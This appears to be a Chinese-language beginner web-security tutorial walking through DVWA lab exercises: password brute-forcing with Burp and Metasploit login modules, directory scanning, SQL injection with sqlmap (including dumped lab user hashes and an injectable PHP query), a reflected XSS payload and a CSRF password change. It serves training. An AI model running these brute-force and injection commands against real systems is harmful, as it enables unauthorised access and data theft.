# WEB安全基础篇

![](img/1/10.png)

**目录**
- [WEB安全基础篇](#web安全基础篇)
	- [网络基础](#网络基础)
	- [渗透测试流程](#渗透测试流程)
	- [渗透测试工具介绍](#渗透测试工具介绍)
		- [KALI Linux](#kali-linux)
		- [Metasploit](#metasploit)
- [WEB安全篇--上](#web安全篇--上)
	- [暴力破解](#暴力破解)
		- [Burp Suite](#burp-suite)
		- [MSF 爆破模块](#msf-爆破模块)
	- [目录扫描](#目录扫描)
	- [SQL注入](#sql注入)
	- [XSS](#xss)
	- [CSRF](#csrf)
- [总结](#总结)

## 网络基础

<p align="center"><img src="img/1/1.png" width="800px"></p>

1. 要建立一个网站首先要有服务器，服务器得装操作系统，比较常见的服务器操作系统有：`Windows Server、Linux`

<p align="center"><img src="img/1/2.png" width="800px"></p>

2. 有了操作系统，还需要中间件才能搭建网站，常见的中间件有`:Apach、nginx、tomcat`

<p align="center"><img src="img/1/3.png" width="800px"></p>

3. 网站的搭建一般需要数据库去存放数据，常见的数据库有：`MySQL、SQLserver、oracle`

<p align="center"><img src="img/1/4.png" width="800px"></p>

4. 网站是由代码编写的，常见的代码有：`ASP、PHP、JSP`。代码则需要脚本解释器去解析。

<p align="center"><img src="img/1/5.png" width="800px"></p>

5. 网页上还有一些静态资源用来装饰：`html、css、javascript`

<p align="center"><img src="img/1/6.png" width="800px"></p>


## 渗透测试流程

常见WEB渗透中 渗透测试流程

<p align="center"><img src="img/1/7.png" width="800px"></p>

## 渗透测试工具介绍

这里简单介绍一下常用的渗透测试虚拟机和工具

### KALI Linux

KALI Linux 是一个渗透测试和安全审计Linux发行版。渗透测试中必备工具之一。自带了大量的渗透测试工具和搭建好的环境。可以说是在安全测试方面最好的开箱即用的 Linux 发行版。

> IOS下载地址：https://www.kali.org/docs/

<p align="center"><img src="img/1/8.png" width="800px"></p>

### Metasploit

Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。

Metasploit的设计初衷是打造成一个攻击工具开发平台，后因为不断的有用户添加并开源漏洞进入后。成为一个最为常用的渗透测试框架。

> 下载地址 https://www.metasploit.com/

<p align="center"><img src="img/1/9.png" width="800px"></p>



# WEB安全篇--上

<p align="center"><img src="img/1/45.png" width="800px"></p>



## 暴力破解

渗透测试过程中，可能会遇到B/S架构的登录页面，比如公司内部的邮件系统，用户管理，登录系统等等。为了测试组织人员安全意识，是否更改默认密码，是否有弱口令存在等情况，可通过爆破的方式进行测试。

```bash
==============渗透测试靶机环境=============

渗透测试靶场：

网址：http://1.117.43.77/index.php

工具：Burp、sqlmap

搭建：

docker run --rm -it -p 80:80 vulnerables/web-dvwa

================正式开式================
```

### Burp Suite

**使用Burp工具进行爆破**

<p align="center"><img src="img/1/11.png" width="800px"></p>

1. 打开BURP内置浏览器

<p align="center"><img src="img/1/12.png" width="800px"></p>

2. 打开抓包，抓取发送的数据包信息

<p align="center"><img src="img/1/13.png" width="800px"></p>

3. HTTP数据结构解析

<p align="center"><img src="img/1/14.png" width="800px"></p>


```bash
POST /login.php HTTP/1.1
Host: 1.117.43.77				# 指定请求的服务器的域名和端口号
Content-Length: 87				# 请求的内容长度
Cache-Control: max-age=0 			# 指定请求和响应遵循的缓存机制
Upgrade-Insecure-Requests: 1			# 向服务器指定某种传输协议以便服务器进行转换
Content-Type: application/x-www-form-urlencoded	# 请求的与实体对应的MIME信息
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html 				# 指定客户端能够接收的内容类型
Referer: http://1.117.43.77/login.php 		# 先前网页的地址，当前请求网页紧随其后,即来路
Accept-Encoding: gzip, deflate			# 指定浏览器可以支持的web服务器返回内容压缩编码类型。
Accept-Language: zh-CN,zh;q=0.9			# 浏览器可接受的语言
Cookie: PHPSESSID=2q4cdd30f3f84i1p9kn26tcnj6; security=low	# HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器
Connection: close				# 表示是否需要持久连接

username=admin&password=1234556&Login=Login&user_token=2dfeac8efc0b43e3b0cdbfd094a2b194
```


4. 对目标账号密码进行爆破

<p align="center"><img src="img/1/15.png" width="800px"></p>

对目标账户密码进行爆破测试

<p align="center"><img src="img/1/16.png" width="800px"></p>

5. 点击 `Payload` Load 添加账户密码

<p align="center"><img src="img/1/17.png" width="800px"></p>


6. 开始爆破管理员密码信息

<p align="center"><img src="img/1/18.png" width="800px"></p>

7. 测试完毕后，通过对比包长度，可以确定密码是否爆破成功，下图中，红框内的长度有别于其它长度，应该正确密码就是它（可能性较大）。

`password`为admin的密码

<p align="center"><img src="img/1/43.png" width="800px"></p>



**Header:请求头参数详解**

<table>
<thead>
<tr>
<th align="center">Header</th>
<th align="center">解释</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Accept</td>
<td align="center">指定客户端能够接收的内容类型</td>
<td align="center">Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td align="center">Accept-Charset</td>
<td align="center">浏览器可以接受的字符编码集。</td>
<td align="center">Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td align="center">Accept-Encoding</td>
<td align="center">指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
<td align="center">Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td align="center">Accept-Language</td>
<td align="center">浏览器可接受的语言</td>
<td align="center">Accept-Language: en,zh</td>
</tr>
<tr>
<td align="center">Accept-Ranges</td>
<td align="center">可以请求网页实体的一个或者多个子范围字段</td>
<td align="center">Accept-Ranges: bytes</td>
</tr>
<tr>
<td align="center">Authorization</td>
<td align="center">HTTP授权的授权证书</td>
<td align="center">Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td align="center">Cache-Control</td>
<td align="center">指定请求和响应遵循的缓存机制</td>
<td align="center">Cache-Control: no-cache</td>
</tr>
<tr>
<td align="center">Connection</td>
<td align="center">表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
<td align="center">Connection: close</td>
</tr>
<tr>
<td align="center">Cookie</td>
<td align="center">HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
<td align="center">Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td align="center">Content-Length</td>
<td align="center">请求的内容长度</td>
<td align="center">Content-Length: 348</td>
</tr>
<tr>
<td align="center">Content-Type</td>
<td align="center">请求的与实体对应的MIME信息</td>
<td align="center">Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td align="center">Date</td>
<td align="center">请求发送的日期和时间</td>
<td align="center">Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td align="center">Expect</td>
<td align="center">请求的特定的服务器行为</td>
<td align="center">Expect: 100-continue</td>
</tr>
<tr>
<td align="center">From</td>
<td align="center">发出请求的用户的Email</td>
<td align="center">From: <a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#117;&#115;&#x65;&#x72;&#x40;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></td>
</tr>
<tr>
<td align="center">Host</td>
<td align="center">指定请求的服务器的域名和端口号</td>
<td align="center">Host: <a target="_blank" rel="noopener" href="http://www.ffffffff0x.com/">https://www.ffffffff0x.com/</a></td>
</tr>
<tr>
<td align="center">If-Match</td>
<td align="center">只有请求内容与实体相匹配才有效</td>
<td align="center">If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td align="center">If-Modified-Since</td>
<td align="center">如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
<td align="center">If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td align="center">If-None-Match</td>
<td align="center">如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
<td align="center">If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td align="center">If-Range</td>
<td align="center">如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
<td align="center">If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td align="center">If-Unmodified-Since</td>
<td align="center">只在实体在指定时间之后未被修改才请求成功</td>
<td align="center">If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td align="center">Max-Forwards</td>
<td align="center">限制信息通过代理和网关传送的时间</td>
<td align="center">Max-Forwards: 10</td>
</tr>
<tr>
<td align="center">Pragma</td>
<td align="center">用来包含实现特定的指令</td>
<td align="center">Pragma: no-cache</td>
</tr>
<tr>
<td align="center">Proxy-Authorization</td>
<td align="center">连接到代理的授权证书</td>
<td align="center">Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td align="center">Range</td>
<td align="center">只请求实体的一部分，指定范围</td>
<td align="center">Range: bytes=500-999</td>
</tr>
<tr>
<td align="center">Referer</td>
<td align="center">先前网页的地址，当前请求网页紧随其后,即来路</td>
<td align="center">Referer: <a target="_blank" rel="noopener" href="https://ffffffff0x.com/">https://ffffffff0x.com</a></td>
</tr>
<tr>
<td align="center">TE</td>
<td align="center">客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
<td align="center">TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td align="center">Upgrade</td>
<td align="center">向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
<td align="center">Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td align="center">User-Agent</td>
<td align="center">User-Agent的内容包含发出请求的用户信息</td>
<td align="center">User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td align="center">Via</td>
<td align="center">通知中间网关或代理服务器地址，通信协议</td>
<td align="center">Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td align="center">Warning</td>
<td align="center">关于消息实体的警告信息</td>
<td align="center">Warn: 199 Miscellaneous warning</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>

### MSF 爆破模块

> 利用kali 里面的msf 进行爆破弱口令

```bash
use  auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS  IP
set RPORT 	PORT
run
```


1. 运行命令查找关于 tomcat 的辅助模块  `msf6 > search tomcat`

<p align="center"><img src="img/1/46.png" width="800px"></p>

2. 找到需要的功能模块 `auxiliary/scanner/http/tomcat_mgr_login`

<p align="center"><img src="img/1/47.png" width="800px"></p>

3. 进入模块 `use  auxiliary/scanner/http/tomcat_mgr_login`

<p align="center"><img src="img/1/48.png" width="800px"></p>

4. 开始配置 IP地址，端口号,配置完成执行命令 ` show options`  查看有没有IP 端口有没有配置正确

<p align="center"><img src="img/1/49.png" width="800px"></p>

5. 执行命令 `run` 开始爆破

<p align="center"><img src="img/1/50.png" width="800px"></p>

6. 成功爆破出密码，登录tomcat 后台

<p align="center"><img src="img/1/51.png" width="800px"></p>

**msf各种服务弱口令爆破**

```bash
# 使用扫描模块
use scanner/portscan/tcp

# 爆破ssh
Msf>use auxiliary/scanner/ssh/ssh_login

# 爆破ftp
Msf>use auxiliary/scanner/ftp/ftp_login

# 爆破telnet
Msf>use auxiliary/scanner/telnet/telnet_login

# 爆破smb
auxiliary/scanner/smb/smb_login

# 爆破Mysql
use scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /root/passlist.txt
PASS_FILE => /root/passlist.txt
```




---

## 目录扫描

目录扫描在实战渗透的过程中很重要，属于早发现早渗透。发现关键资产信息和目录直接开打
比如实战中的上传、管理后台、phpinfo、phpmyadmin登录页、⽹站源码备份等。

```bash
==============渗透测试靶机环境=============

目标：对靶场IP进行扫描，发现敏感信息

渗透测试靶场：

IP: 1.117.43.77

工具：Railgun

================正式开式================
```

**目录扫描原理**：

不断通过提交⼀个HTTP请求来获取HTTP返回包，以查看返回包的信息来判断某个⽬录（⽂件）是否存在，直到结束。
请求方式：GET请求（完整）、HEAD请求（快）。

常见工具： ffuf、burpsuite、Railgun 等

**使用Railgun工具进行目录扫描**

1. 打开软件对目标进行端口扫描

<p align="center"><img src="img/1/19.png" width="800px"></p>

2. 选中网站端口，发送到目录爆破接口

<p align="center"><img src="img/1/20.png" width="800px"></p>

3. 对目标IP网站进行爆破

<p align="center"><img src="img/1/21.png" width="800px"></p>

4. 发现敏感文件，双击下载即可

**扫描字典**

- [AboutSecurity](https://github.com/ffffffff0x/AboutSecurity)



---

## SQL注入

SQL注入攻击是通过将恶意的SQL查询或添加语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前是黑客对数据库进行攻击的最常用的手段之一。

<p align="center"><img src="img/1/40.png" width="800px"></p>

```bash
==============渗透测试靶机环境=============

渗透测试靶场：

目标：通过SQL注入漏洞查询敏感信息

网址: http://1.117.43.77/vulnerabilities/sqli/

工具：BURP、SQLmap

================正式开式================
```

**使用 SQLMAP 对目标进行 SQL注入**

<p align="center"><img src="img/1/29.png" width="800px"></p>

1. 打开页面，该页面是个模拟搜索的功能模块，可以输入1，2，3等查询信息。

输入`1'` 发现返回数据库报错

<p align="center"><img src="img/1/22.png" width="800px"></p>

2. 发现存在显错注入。注入点是 sql查询接口

```php
$id=$_GET['id'];
$query  = "SELECT * FROM `users` WHERE ID = '$id';";
```

<p align="center"><img src="img/1/23.png" width="800px"></p>

3. 抓包后放入`SQLmap` 进行注入攻击


<p align="center"><img src="img/1/24.png" width="800px"></p>


4. 使用命令对注入点进行注入

```bash
python3 sqlmap.py -r 1.txt
```

<p align="center"><img src="img/1/25.png" width="800px"></p>

5. 注出所有数据库信息

```bash
python3 sqlmap.py -r 1.txt --dbs
```

<p align="center"><img src="img/1/26.png" width="800px"></p>

查询出所有库：

```bash
available databases [2]:
[*] dvwa
[*] information_schema
```


6. 选择 `dvwa` 数据库注出表名

```
python3 sqlmap.py -r 1.txt -D dvwa --tables
```

<p align="center"><img src="img/1/27.png" width="800px"></p>

查询出 dvwa 中所有表的信息

```bash
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

7. 注出 `dvwa` 数据库中 `users` 表中 所有信息

```
python3 sqlmap.py -r 1.txt -D dvwa -T users --dump
```

<p align="center"><img src="img/1/28.png" width="800px"></p>

```bash
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2021-11-04 02:49:45 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2021-11-04 02:49:45 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2021-11-04 02:49:45 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2021-11-04 02:49:45 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2021-11-04 02:49:45 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
```

至此，所有用户敏感信息已经全部注入出。


**SQLmap常用代码**

```bash
sqlmap -u URL/-r xxx.txt --current-db          # 获取当前数据库
sqlmap -u URL/-r xxx.txt --dbs                 # 枚举所有数据库
sqlmap -u URL/-r xxx.txt -f                    # 检查 DBMS 版本
sqlmap -u URL/-r xxx.txt --is-dba              # 判断当前用户是否是 dba
sqlmap -u URL/-r xxx.txt --users               # 列出数据库管理系统用户
sqlmap -u URL/-r xxx.txt --privileges          # 枚举 DBMS 用户权限
sqlmap -u URL/-r xxx.txt --passwords           # 获取当前数据库密码

sqlmap -u URL/-r xxx.txt -D DATABASE --tables  # 获取数据库表
sqlmap -u URL/-r xxx.txt -D DATABASE -T TABLES --columns           # 获取指定表的列名
sqlmap -u URL/-r xxx.txt -D DATABASE -T TABLES -C COLUMNS --dump   # 获取指定表的列名
sqlmap -u URL/-r xxx.txt -dbms mysql -level 3 -D test -T admin -C "username,password" -dump    # dump 出字段 username 与 password 中的数据
sqlmap -u URL/-r xxx.txt --dump-all            # 列出所有数据库,所有表内容

```

---

## XSS

由于web应用程序对用户的输入过滤不严产生的。攻击者利用网站漏把恶意的脚本代码注入到网页中，当用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。

<p align="center"><img src="img/1/39.png" width="800px"></p>

```bash
==============渗透测试靶机环境=============

渗透测试靶场：

目标：对靶场输入框进行XSS攻击，直到执行恶意代码。

网站: http://1.117.43.77/vulnerabilities/xss_r/

工具: BURP

================正式开式================
```

**对目标输入框进行XSS攻击**

1. 先检测是否存在 `XSS` 漏洞，输入 ` 1<b>1` 如果后面的1被加粗则存在 XSS 漏洞

<p align="center"><img src="img/1/30.png" width="800px"></p>

2. 使用XSS 弹框代码进行攻击

```
<script>alert(/xss/)</script>
```

<p align="center"><img src="img/1/31.png" width="800px"></p>

此时我们的恶意代码被浏览器解析。成功触发 xss 漏洞


**XSS代码备忘录**

在线靶场：https://demo.testfire.net/search.jsp
在线XSS代码备忘录：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

<p align="center"><img src="img/1/32.png" width="800px"></p>


---

## CSRF

CSRF是跨站伪造请求，常见攻击手段发送csrf的连接，通过伪造请求从而受害者点击后会利用受害者的身份发起这个请求。例如新增一个账号，修改用户密码等等。

<p align="center"><img src="img/1/42.png" width="800px"></p>

在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。


```bash
==============渗透测试靶机环境=============

渗透测试靶场：

目标：对靶场修改密码进行伪造，从而实现利用 CSRF修改密码

网站: http://1.117.43.77/vulnerabilities/csrf/

工具: BURP

================正式开式================
```

1. 点击修改密码进行抓包

<p align="center"><img src="img/1/34.png" width="800px"></p>

2. 生成一个伪造的修改密码的页面

<p align="center"><img src="img/1/33.png" width="800px"></p>

3. 这就是`CSRF`利用页面

<p align="center"><img src="img/1/35.png" width="800px"></p>

<p align="center"><img src="img/1/36.png" width="800px"></p>

4. 将生成的页面放入浏览器中，点击即可触发

<p align="center"><img src="img/1/37.png" width="800px"></p>


5. 进行验证，发现我们的账号已经被修改

<p align="center"><img src="img/1/38.png" width="800px"></p>

此时提示登录失败，密码已经被改为我们设定的密码。

<p align="center"><img src="img/1/44.png" width="800px"></p>



---

# 总结

1. 对网络基础进行学习，渗透测试环境搭建
2. 学习渗透测试常用工具，工具之间的联动
3. 针对DVWA靶场进行WEB入门学习
4. 做好笔记，针对靶场进行训练